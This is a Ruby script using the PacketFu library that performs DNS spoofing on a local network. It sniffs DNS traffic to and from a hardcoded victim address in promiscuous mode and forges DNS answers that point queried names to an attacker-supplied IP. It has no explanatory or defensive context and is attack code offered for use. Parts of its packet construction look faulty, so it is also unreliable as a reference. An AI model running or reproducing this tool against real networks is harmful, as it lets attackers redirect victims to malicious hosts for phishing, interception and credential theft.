#!/usr/bin/env ruby

require 'packetfu'
require 'pp'
include PacketFu

def readable(raw_domain)

  #prevent processing non-domain
  if raw_domain[0].ord == 0
    puts "ERROR : THE DOMAIN STARTS WITH 0"
    return raw_domain[1..-1]
  end

  fqdn = ""
  length_offset = raw_domain[0].ord
  full_length   = raw_domain[ 0..length_offset ].length
  domain_name   = raw_domain[(full_length - length_offset)..length_offset]

  while length_offset != 0
    fqdn << domain_name + "."
    length_offset = raw_domain[full_length].ord
    domain_name   = raw_domain[full_length + 1 .. full_length + length_offset]
    full_length   = raw_domain[0 .. full_length + length_offset].length
  end

  return fqdn.chomp!('.')
end

#
#send response

def spoof_response(packet, domain)

  attackerdomain_name = ARGV[0]
  attackerdomain_ip   = ARGV[1].split('.').map {|oct| oct.to_i}.pack('c*')      #spoofing IP

  #build udp packet
  response = UDPPacket.new(:config => PacketFu::Utils.ifconfig(ARGV[2]))
  response.udp_src   = packet.udp_dst         #source port
  response.udp_dst   = packet.udp_src         #destination port
  response.ip_saddr  = packet.ip_daddr        #modems IP address
  response.ip_daddr  = packet.ip_saddr        #victims IP address
  response.eth_daddr = packet.eth_saddr       #victims MAC address
  response.payload   = packet.payload[0,1]         #transaction ID
  response.payload  += "\x81\x80"             #Flags: Reply code: No error (0)
  response.payload  += "\x00\x01"             #Question: 1
  response.payload  += "\x00\x00"             #Answer RRs: 0
  response.payload  += "\x00\x00"             #Authority RRs: 0
  response.payload  += "\x00\x00"             #Additional RRs: 0
  response.payload  += attackerdomain_name.split('.').map do |section|          #convert domain to DNS
    [section.size.chr, section.chars.map {|c| '\x%x' % c.ord}.join]
  end.join + "\x00"
  response.payload  += "\x00\x01"         #Queries | Type: A
  response.payload  += "\x00\x01"         #Queries | Class: IN
  response.payload  += "\xc0\x0c"         #Answer | Name: x.com
  response.payload  += "\x00\x01"         #Answer | Type: A
  response.payload  += "\x00\x01"         #Answer | Class: IN
  response.payload  += "\x00\x00\x00\x25" #Answer | Time: 37 sec
  response.payload  += "\x00\x04"         #Answer | Data length: 4
  response.payload  += attackerdomain_ip  #Answer | Addr
  response.recalc                         #Calculate the packet
  response.to_w(response.iface)           #Send packet through our interface
end


filter = "udp and port 53 and host " + "192.168.0.21"
@capture = Capture.new(:iface => ARGV[2], :start => true, :promisc => true, :filter => filter, :save => true)
#find DNS packets
@capture.stream.each do |pkt|
  #make sure packet is parsable
  if UDPPacket.can_parse?(pkt)
    packet = Packet.parse(pkt)

    #get offset of the query type
    dns_query = packet.payload[2..3].to_s

    #make sure we have a DNS query packet
    if dns_query == "\x01\x00"
      #convert to domain name
      domain_name = packet.payload[12..-1].to_s
      fqdn = readable(domain_name)
      #ignore non query packet
      next if domain_name.nil?
      puts "DNS request for: " + fqdn

    end
    #make sure there is a dns reply packet
    if dns_query == "\x81\x80"
      domain_name = packet.payload[12..-1].to_s
      fqdn = readable(domain_name)
      puts "[*] Start Spoofing: " + fqdn
      spoof_response packet, domain_name
    end

  end
end
